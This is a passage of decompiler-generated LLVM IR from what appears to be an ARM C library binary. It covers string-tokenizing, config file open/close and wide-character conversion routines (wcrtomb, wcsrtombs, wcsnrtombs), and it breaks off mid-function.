  %v0_195f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195f0

dec_label_pc_19638.loopexit:                      ; preds = %bb68, %dec_label_pc_1962c
  %v0_19638.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19638

dec_label_pc_19638:                               ; preds = %dec_label_pc_19590, %dec_label_pc_19638.loopexit
  %v0_19638 = phi i32 [ %v0_19638.pre, %dec_label_pc_19638.loopexit ], [ %v1_195a4, %dec_label_pc_19590 ]
  %v7_19638 = icmp eq i32 %v0_19638, -1
  store i1 %v7_19638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19638, label %dec_label_pc_19780, label %dec_label_pc_19640

dec_label_pc_19640:                               ; preds = %dec_label_pc_19638
  %v0_19640 = load i32, i32* @r5, align 4
  %v1_19640 = add i32 %v0_19640, 4
  %v2_19640 = inttoptr i32 %v1_19640 to i32*
  %v3_19640 = load i32, i32* %v2_19640, align 4
  store i32 %v3_19640, i32* %r0.global-to-local, align 4
  store i32 %v3_19494, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_19640, i32* %v2_1964c, align 4
  %v0_19650 = load i32, i32* @fp, align 4
  %v2_19654 = inttoptr i32 %v3_19640 to i8*
  %v3_19654 = call i32 @__GI_memset(i8* %v2_19654, i32 %v0_19650)
  store i32 %v3_19654, i32* %r0.global-to-local, align 4
  store i32 %v1_194a8, i32* %r2.global-to-local, align 4
  store i1 %v2_1965c, i1* %cpsr_z.global-to-local, align 1
  %v0_19660 = load i32, i32* @r5, align 4
  %v1_19660 = add i32 %v0_19660, 12
  %v2_19660 = inttoptr i32 %v1_19660 to i32*
  %v3_19660 = load i32, i32* %v2_19660, align 4
  store i32 %v3_19660, i32* @r4, align 4
  br i1 %v2_1965c, label %dec_label_pc_19678, label %dec_label_pc_19668

dec_label_pc_19668:                               ; preds = %dec_label_pc_19640
  store i32 %v3_19660, i32* @r0, align 4
  %v1_19670 = inttoptr i32 %v3_19660 to i8*
  %v2_19670 = call i32 @__GI_strspn(i8* %v1_19670)
  store i32 %v2_19670, i32* %r0.global-to-local, align 4
  %v0_19674 = load i32, i32* @r4, align 4
  %v2_19674 = add i32 %v0_19674, %v2_19670
  store i32 %v2_19674, i32* @r4, align 4
  br label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_19640, %dec_label_pc_19668
  %v0_1975013 = phi i32 [ %v3_19660, %dec_label_pc_19640 ], [ %v2_19674, %dec_label_pc_19668 ]
  %v1_19678 = inttoptr i32 %v0_1975013 to i8*
  %v2_19678 = load i8, i8* %v1_19678, align 1
  %v3_19678 = zext i8 %v2_19678 to i32
  store i32 %v3_19678, i32* %r2.global-to-local, align 4
  %v2_1967c = icmp eq i8 %v2_19678, 0
  store i1 %v2_1967c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1967c, label %dec_label_pc_194d0.backedge, label %dec_label_pc_19684

dec_label_pc_194d0.backedge:                      ; preds = %dec_label_pc_19678, %dec_label_pc_19778, %dec_label_pc_19684
  %v0_194d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194d0

dec_label_pc_19684:                               ; preds = %dec_label_pc_19678
  %v0_19684 = load i32, i32* @r7, align 4
  %v1_19684 = inttoptr i32 %v0_19684 to i8*
  %v2_19684 = load i8, i8* %v1_19684, align 1
  %v3_19684 = zext i8 %v2_19684 to i32
  store i32 %v3_19684, i32* %r3.global-to-local, align 4
  %v9_19688 = icmp eq i8 %v2_19684, %v2_19678
  store i1 %v9_19688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19688, label %dec_label_pc_194d0.backedge, label %dec_label_pc_19750.preheader

dec_label_pc_19750.preheader:                     ; preds = %dec_label_pc_19684
  %v1_1968c = load i32, i32* @fp, align 4
  store i32 %v1_1968c, i32* @r6, align 4
  %v2_1975015 = load i8, i8* %v1_19678, align 1
  %v3_1975016 = zext i8 %v2_1975015 to i32
  store i32 %v3_1975016, i32* %r2.global-to-local, align 4
  %v2_1975417 = icmp eq i8 %v2_1975015, 0
  store i1 %v2_1975417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1975417, label %dec_label_pc_1976c, label %dec_label_pc_1975c.preheader

dec_label_pc_1975c.preheader:                     ; preds = %dec_label_pc_19750.preheader
  %v2_1975c82 = load i8, i8* %v1_19684, align 1
  %v3_1975c83 = zext i8 %v2_1975c82 to i32
  store i32 %v3_1975c83, i32* %r3.global-to-local, align 4
  %v9_1976086 = icmp eq i8 %v2_1975c82, %v2_1975015
  store i1 %v9_1976086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1976086, label %dec_label_pc_1976c, label %bb74

dec_label_pc_19698:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_1969c = load i32, i32* %v2_1964c, align 4
  store i32 %v2_1969c, i32* %r3.global-to-local, align 4
  store i32 %v1_194ac, i32* %r2.global-to-local, align 4
  %v9_196a4 = icmp eq i32 %v2_196a888, %v1_194ac
  store i1 %v9_196a4, i1* %cpsr_z.global-to-local, align 1
  %v5_196a8 = mul i32 %v2_196a888, 4
  %v6_196a8 = add i32 %v2_1969c, %v5_196a8
  %v7_196a8 = inttoptr i32 %v6_196a8 to i32*
  store i32 %v0_196a887, i32* %v7_196a8, align 4
  br i1 %v9_196a4, label %dec_label_pc_196b0, label %dec_label_pc_196bc

dec_label_pc_196b0:                               ; preds = %dec_label_pc_19698
  store i32 %v1_194b8, i32* %r3.global-to-local, align 4
  store i1 %v2_196b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196b4, label %dec_label_pc_196bc, label %dec_label_pc_196dc

dec_label_pc_196bc:                               ; preds = %dec_label_pc_196b0, %dec_label_pc_19698
  %v0_196bc = load i32, i32* @r7, align 4
  %v1_196bc = inttoptr i32 %v0_196bc to i8*
  %v2_196bc = load i8, i8* %v1_196bc, align 1
  %v3_196bc = zext i8 %v2_196bc to i32
  store i32 %v3_196bc, i32* %r3.global-to-local, align 4
  %v2_196c0 = icmp eq i8 %v2_196bc, 0
  store i1 %v2_196c0, i1* %cpsr_z.global-to-local, align 1
  %v0_196c4 = load i32, i32* @r4, align 4
  store i32 %v0_196c4, i32* @r0, align 4
  %v1_196c8 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_196c0, i32 %v1_196c8, i32 %v0_196bc
  store i32 %storemerge, i32* @r1, align 4
  %v0_196d0 = call i32 @strcspn()
  store i32 %v0_196d0, i32* %r0.global-to-local, align 4
  %v0_196d4 = load i32, i32* @r4, align 4
  %v2_196d4 = add i32 %v0_196d4, %v0_196d0
  store i32 %v2_196d4, i32* @r4, align 4
  br label %dec_label_pc_19714

dec_label_pc_196dc:                               ; preds = %dec_label_pc_196b0
  %v0_196dc = load i32, i32* @r4, align 4
  store i32 %v0_196dc, i32* @r0, align 4
  %v0_196e0 = load i32, i32* @r7, align 4
  %v1_196e0 = inttoptr i32 %v0_196e0 to i8*
  %v2_196e0 = load i8, i8* %v1_196e0, align 1
  %v3_196e0 = zext i8 %v2_196e0 to i32
  %v5_196e4 = call i32 @__GI_strchrnul(i32 %v0_196dc, i32 %v3_196e0, i32 %v1_194ac, i32 %v1_194b8)
  store i32 %v5_196e4, i32* %r0.global-to-local, align 4
  store i32 %v1_194a8, i32* %r2.global-to-local, align 4
  store i1 %v2_1965c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_196e4, i32* @r4, align 4
  br i1 %v2_1965c, label %dec_label_pc_19714, label %dec_label_pc_19700

dec_label_pc_196fc:                               ; preds = %dec_label_pc_19700
  %v1_196fc = add i32 %v0_19714.pre, -1
  store i32 %v1_196fc, i32* @r4, align 4
  br label %dec_label_pc_19700

dec_label_pc_19700:                               ; preds = %dec_label_pc_196dc, %dec_label_pc_196fc
  %v0_19700 = phi i32 [ %v1_196fc, %dec_label_pc_196fc ], [ %v5_196e4, %dec_label_pc_196dc ]
  %v1_19700 = add i32 %v0_19700, -1
  %v2_19700 = inttoptr i32 %v1_19700 to i8*
  %v3_19700 = load i8, i8* %v2_19700, align 1
  %v4_19700 = zext i8 %v3_19700 to i32
  %v0_19704 = load i32, i32* @sl, align 4
  store i32 %v0_19704, i32* @r0, align 4
  %v2_19708 = call i32 @__GI_strchr(i32 %v0_19704, i32 %v4_19700)
  store i32 %v2_19708, i32* %r0.global-to-local, align 4
  %v2_1970c = icmp eq i32 %v2_19708, 0
  store i1 %v2_1970c, i1* %cpsr_z.global-to-local, align 1
  %v0_19714.pre = load i32, i32* @r4, align 4
  br i1 %v2_1970c, label %dec_label_pc_19714, label %dec_label_pc_196fc

dec_label_pc_19714:                               ; preds = %dec_label_pc_19700, %dec_label_pc_196dc, %dec_label_pc_196bc
  %v3_19720 = phi i32 [ %v5_196e4, %dec_label_pc_196dc ], [ %v2_196d4, %dec_label_pc_196bc ], [ %v0_19714.pre, %dec_label_pc_19700 ]
  %v1_19714 = inttoptr i32 %v3_19720 to i8*
  %v2_19714 = load i8, i8* %v1_19714, align 1
  %v3_19714 = zext i8 %v2_19714 to i32
  store i32 %v3_19714, i32* %r2.global-to-local, align 4
  %v0_19718 = load i32, i32* @r7, align 4
  %v1_19718 = inttoptr i32 %v0_19718 to i8*
  %v2_19718 = load i8, i8* %v1_19718, align 1
  %v3_19718 = zext i8 %v2_19718 to i32
  store i32 %v3_19718, i32* %r3.global-to-local, align 4
  %v9_1971c = icmp eq i8 %v2_19718, %v2_19714
  store i1 %v9_1971c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1971c, label %bb71, label %dec_label_pc_19728

bb71:                                             ; preds = %dec_label_pc_19714
  %v1_19720 = load i32, i32* @fp, align 4
  %v2_19720 = trunc i32 %v1_19720 to i8
  store i8 %v2_19720, i8* %v1_19714, align 1
  %v0_19724.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19724.pr, label %bb73, label %.dec_label_pc_19728_crit_edge

.dec_label_pc_19728_crit_edge:                    ; preds = %bb71
  %v0_19728.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19728

dec_label_pc_19728:                               ; preds = %.dec_label_pc_19728_crit_edge, %dec_label_pc_19714
  %v0_19728 = phi i32 [ %v0_19728.pre, %.dec_label_pc_19728_crit_edge ], [ %v3_19714, %dec_label_pc_19714 ]
  %v2_19728 = icmp eq i32 %v0_19728, 0
  store i1 %v2_19728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19728, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_19728
  %v1_1972c = load i32, i32* @fp, align 4
  %v2_1972c = trunc i32 %v1_1972c to i8
  %v3_1972c = load i32, i32* @r4, align 4
  %v4_1972c = inttoptr i32 %v3_1972c to i8*
  store i8 %v2_1972c, i8* %v4_1972c, align 1
  %v5_1972c = load i32, i32* @r4, align 4
  %v6_1972c = add i32 %v5_1972c, 1
  store i32 %v6_1972c, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_19728, %bb72
  %v2_19730 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_19730, i32* %r3.global-to-local, align 4
  %v2_19734 = icmp eq i32 %v2_19730, 0
  store i1 %v2_19734, i1* %cpsr_z.global-to-local, align 1
  %v0_19750.pre = load i32, i32* @r4, align 4
  br i1 %v2_19734, label %dec_label_pc_1974c, label %dec_label_pc_1973c

dec_label_pc_1973c:                               ; preds = %bb73
  store i32 %v0_19750.pre, i32* @r0, align 4
  %v1_19744 = inttoptr i32 %v0_19750.pre to i8*
  %v2_19744 = call i32 @__GI_strspn(i8* %v1_19744)
  store i32 %v2_19744, i32* %r0.global-to-local, align 4
  %v0_19748 = load i32, i32* @r4, align 4
  %v2_19748 = add i32 %v0_19748, %v2_19744
  store i32 %v2_19748, i32* @r4, align 4
  br label %dec_label_pc_1974c

dec_label_pc_1974c:                               ; preds = %bb73, %dec_label_pc_1973c
  %v0_19750 = phi i32 [ %v2_19748, %dec_label_pc_1973c ], [ %v0_19750.pre, %bb73 ]
  %v0_1974c = load i32, i32* @r6, align 4
  %v1_1974c = add i32 %v0_1974c, 1
  store i32 %v1_1974c, i32* @r6, align 4
  %v1_19750 = inttoptr i32 %v0_19750 to i8*
  %v2_19750 = load i8, i8* %v1_19750, align 1
  %v3_19750 = zext i8 %v2_19750 to i32
  store i32 %v3_19750, i32* %r2.global-to-local, align 4
  %v2_19754 = icmp eq i8 %v2_19750, 0
  store i1 %v2_19754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19754, label %dec_label_pc_1976c, label %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge

dec_label_pc_1974c.dec_label_pc_1975c_crit_edge:  ; preds = %dec_label_pc_1974c
  %v0_1975c.pre = load i32, i32* @r7, align 4
  %v1_1975c = inttoptr i32 %v0_1975c.pre to i8*
  %v2_1975c = load i8, i8* %v1_1975c, align 1
  %v3_1975c = zext i8 %v2_1975c to i32
  store i32 %v3_1975c, i32* %r3.global-to-local, align 4
  %v9_19760 = icmp eq i8 %v2_1975c, %v2_19750
  store i1 %v9_19760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19760, label %dec_label_pc_1976c, label %bb74

bb74:                                             ; preds = %dec_label_pc_1975c.preheader, %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge
  %v2_196a888 = phi i32 [ %v1_1974c, %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge ], [ %v1_1968c, %dec_label_pc_1975c.preheader ]
  %v0_196a887 = phi i32 [ %v0_19750, %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge ], [ %v0_1975013, %dec_label_pc_1975c.preheader ]
  %v2_19764 = load i32, i32* @sb, align 4
  %v3_19764 = sub i32 %v2_196a888, %v2_19764
  %v5_19764 = xor i32 %v2_19764, %v2_196a888
  %v6_19764 = xor i32 %v3_19764, %v2_196a888
  %v7_19764 = and i32 %v6_19764, %v5_19764
  %v8_19764 = icmp slt i32 %v7_19764, 0
  %v9_19764 = icmp slt i32 %v3_19764, 0
  %v10_19764 = icmp eq i32 %v2_196a888, %v2_19764
  store i1 %v10_19764, i1* %cpsr_z.global-to-local, align 1
  %v2_19768 = xor i1 %v9_19764, %v8_19764
  br i1 %v2_19768, label %dec_label_pc_19698, label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %dec_label_pc_1975c.preheader, %bb74, %dec_label_pc_1974c, %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge, %dec_label_pc_19750.preheader
  %v0_19770 = phi i32 [ %v1_1968c, %dec_label_pc_19750.preheader ], [ %v1_1968c, %dec_label_pc_1975c.preheader ], [ %v2_196a888, %bb74 ], [ %v1_1974c, %dec_label_pc_1974c ], [ %v1_1974c, %dec_label_pc_1974c.dec_label_pc_1975c_crit_edge ]
  store i32 %v3_19490, i32* %r2.global-to-local, align 4
  %v9_19770 = icmp eq i32 %v0_19770, %v3_19490
  store i1 %v9_19770, i1* %cpsr_z.global-to-local, align 1
  %v6_19774 = icmp slt i32 %v0_19770, %v3_19490
  br i1 %v6_19774, label %dec_label_pc_19778, label %dec_label_pc_19784

dec_label_pc_19778:                               ; preds = %dec_label_pc_1976c
  %v0_19778 = load i32, i32* @r8, align 4
  %v1_19778 = and i32 %v0_19778, 1048576
  %v2_19778 = icmp eq i32 %v1_19778, 0
  store i1 %v2_19778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19778, label %dec_label_pc_194d0.backedge, label %dec_label_pc_19780

dec_label_pc_19780:                               ; preds = %dec_label_pc_19778, %dec_label_pc_19638, %.thread, %entry
  br label %dec_label_pc_19784

dec_label_pc_19784:                               ; preds = %dec_label_pc_1976c, %dec_label_pc_19554, %dec_label_pc_19780
  %v0_19784 = phi i32 [ %v0_19564, %dec_label_pc_19554 ], [ 0, %dec_label_pc_19780 ], [ %v0_19770, %dec_label_pc_1976c ]
  store i32 %v0_19784, i32* %r0.global-to-local, align 4
  store i32 %v3_1946c, i32* @r4, align 4
  store i32 %v6_1946c, i32* @r5, align 4
  store i32 %v9_1946c, i32* @r6, align 4
  store i32 %v12_1946c, i32* @r7, align 4
  store i32 %v15_1946c, i32* @r8, align 4
  store i32 %v18_1946c, i32* @sb, align 4
  store i32 %v21_1946c, i32* @sl, align 4
  store i32 %v24_1946c, i32* @fp, align 4
  ret i32 %v0_19784

; uselistorder directives
  uselistorder i32 %v0_19784, { 1, 0 }
  uselistorder i32 %v0_19770, { 0, 2, 1 }
  uselistorder i32 %v3_19764, { 1, 0 }
  uselistorder i32 %v2_19764, { 1, 0, 2 }
  uselistorder i32 %v2_196a888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_19760, { 1, 0 }
  uselistorder i32 %v0_19750.pre, { 0, 2, 1 }
  uselistorder i32 %v5_196e4, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1976086, { 1, 0 }
  uselistorder i1 %v9_19688, { 1, 0 }
  uselistorder i32 %v3_19660, { 0, 2, 1, 3 }
  uselistorder i1 %v7_19638, { 1, 0 }
  uselistorder i1 %v8_19630, { 1, 0 }
  uselistorder i32 %v3_19600, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_195f0, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_195d8, { 1, 0, 2 }
  uselistorder i32 %v1_195c8, { 1, 0, 2 }
  uselistorder i32 %v0_195b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_195ac, { 1, 0 }
  uselistorder i32 %v1_19598, { 1, 0 }
  uselistorder i32 %v1_19594, { 1, 0 }
  uselistorder i32 %v2_19570, { 1, 0 }
  uselistorder i32 %v1_19554, { 2, 0, 1 }
  uselistorder i32 %v0_1953c, { 1, 0 }
  uselistorder i32 %v1_1952c, { 0, 2, 1 }
  uselistorder i1 %v2_1965c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_194b8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_194ac, { 2, 1, 0 }
  uselistorder i32 %v3_19494, { 1, 0 }
  uselistorder i32 %v3_19490, { 2, 1, 0 }
  uselistorder i32 %v1_19488, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_19784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1976c, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1974c, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19700, { 1, 0 }
  uselistorder label %dec_label_pc_194d0.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19678, { 1, 0 }
  uselistorder label %dec_label_pc_19638, { 1, 0 }
  uselistorder label %dec_label_pc_1962c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_195f0, { 1, 0 }
  uselistorder label %dec_label_pc_19524, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_19798 = icmp eq i32* %arg1, null
  br i1 %v2_19798, label %dec_label_pc_197c0, label %dec_label_pc_197a0

dec_label_pc_197a0:                               ; preds = %entry
  %v2_197a0 = load i32, i32* %arg1, align 4
  %v1_197a4 = inttoptr i32 %v2_197a0 to i16*
  %v2_197a4 = call i32 @__GI_fclose(i16* %v1_197a4)
  %v0_197a8 = load i32, i32* @r4, align 4
  %v1_197a8 = add i32 %v0_197a8, 20
  %v2_197a8 = inttoptr i32 %v1_197a8 to i32*
  %v3_197a8 = load i32, i32* %v2_197a8, align 4
  %v2_197ac = icmp eq i32 %v3_197a8, 0
  br i1 %v2_197ac, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_197a0
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_197a0, %bb
  store i32 104376, i32* @lr, align 4
  %v1_197b4 = xor i1 %v2_197ac, true
  call void @__pseudo_cond_branch(i1 %v1_197b4, i32 ptrtoint (i32* @global_var_17268.1116 to i32))
  %v0_197b8 = load i32, i32* @r4, align 4
  store i32 %v0_197b8, i32* @r0, align 4
  %v0_197bc = call i32 @free()
  br label %dec_label_pc_197c0

dec_label_pc_197c0:                               ; preds = %entry, %bb6
  %v1_197c4 = phi i32 [ 0, %entry ], [ %v0_197bc, %bb6 ]
  ret i32 %v1_197c4

; uselistorder directives
  uselistorder label %dec_label_pc_197c0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_197d4 = load i32, i32* @r4, align 4
  store i32 %v3_197d4, i32* %stack_var_-8, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33924), i32* @r1, align 4
  %v0_197dc = load i32, i32* @r0, align 4
  %v2_197dc = load i32, i32* @r2, align 4
  %v5_197dc = call i32 @__GI_fopen(i32 %v0_197dc, i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33924), i32 %v2_197dc, i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32))
  store i32 %v5_197dc, i32* %r0.global-to-local, align 4
  store i32 %v5_197dc, i32* @r4, align 4
  %v2_197e0 = icmp eq i32 %v5_197dc, 0
  br i1 %v2_197e0, label %bb, label %dec_label_pc_197ec

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_197ec:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_197f4 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_197f4, i32* %r0.global-to-local, align 4
  %v2_197f8 = icmp eq i32 %v2_197f4, 0
  br i1 %v2_197f8, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_197ec
  %v1_197fc = load i32, i32* @r4, align 4
  %v3_197fc = inttoptr i32 %v2_197f4 to i32*
  store i32 %v1_197fc, i32* %v3_197fc, align 4
  %v1_19804.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_197ec, %bb4
  %v1_19804 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_197ec ], [ %v1_19804.pre, %bb4 ]
  %v2_19800 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19800, i32* @r4, align 4
  ret i32 %v1_19804

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33924), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_19810 = load i32, i32* @lr, align 4
  %v2_19814 = icmp eq i32 %arg1, 0
  br i1 %v2_19814, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_1981c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_19844 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_19830 = phi i32 [ %arg1, %.thread ], [ %v3_1981c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_1982c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1982c, i32* @ip, align 4
  %v2_19834 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_1982c, i32* %stack_var_-16, align 4
  store i32 %v0_19844, i32* %stack_var_-12, align 4
  %v5_1984c = inttoptr i32 %v0_19830 to i8*
  %v6_1984c = call i32 @__GI_wcsnrtombs(i8* %v5_1984c, i32 %v2_19834, i32 1, i32 16, i32 %arg3)
  %v2_19850 = icmp eq i32 %v6_1984c, 0
  br i1 %v2_19850, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_19860 = phi i32 [ %v6_1984c, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_19810, i32* @lr, align 4
  ret i32 %v1_19860

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_19878 = load i32, i32* @r0, align 4
  %v1_19878 = load i32, i32* @r1, align 4
  %v5_19878 = inttoptr i32 %v0_19878 to i8*
  %v6_19878 = call i32 @__GI_wcsnrtombs(i8* %v5_19878, i32 %v1_19878, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_19878

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19888 = load i32, i32* @r4, align 4
  store i32 %v3_19888, i32* %stack_var_-12, align 4
  %v10_1988c = icmp eq i32 %tmp, %arg2
  store i1 %v10_1988c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_1988c, label %dec_label_pc_198a4, label %bb

bb:                                               ; preds = %entry
  %v4_19890 = icmp eq i8* %arg1, null
  store i1 %v4_19890, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_19890, label %dec_label_pc_198a4.thread, label %bb39

dec_label_pc_198a4.thread:                        ; preds = %bb
  %v2_19894 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_198a4:                               ; preds = %entry
  %v2_198941 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_198a4 = icmp eq i8* %arg1, null
  store i1 %v3_198a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_198a4, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_198a4
  store i32 %v2_198941, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_198a4, %dec_label_pc_198a4.thread
  %storemerge20 = phi i32 [ %v2_198941, %dec_label_pc_198a4 ], [ %v2_19894, %dec_label_pc_198a4.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1990028 = phi i32 [ %v2_198941, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_198bc = load i32, i32* @r3, align 4
  %v3_198bc = icmp uge i32 %v0_198bc, %arg3
  %arg3.v0_198bc = select i1 %v3_198bc, i32 %arg3, i32 %v0_198bc
  store i32 %arg3.v0_198bc, i32* %r5.global-to-local, align 4
  %v1_198c8 = inttoptr i32 %arg2 to i32*
  %v2_198c8 = load i32, i32* %v1_198c8, align 4
  store i32 %v2_198c8, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_198bc, i32* %r0.global-to-local, align 4
  %v2_1991422 = icmp eq i32 %arg3.v0_198bc, 0
  store i1 %v2_1991422, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1991422, label %dec_label_pc_1991c, label %dec_label_pc_198d4

dec_label_pc_198d4:                               ; preds = %.thread14.thread, %dec_label_pc_1990c.dec_label_pc_198d4_crit_edge
  %v2_19900 = phi i32 [ %v2_1990c, %dec_label_pc_1990c.dec_label_pc_198d4_crit_edge ], [ %v2_1990028, %.thread14.thread ]
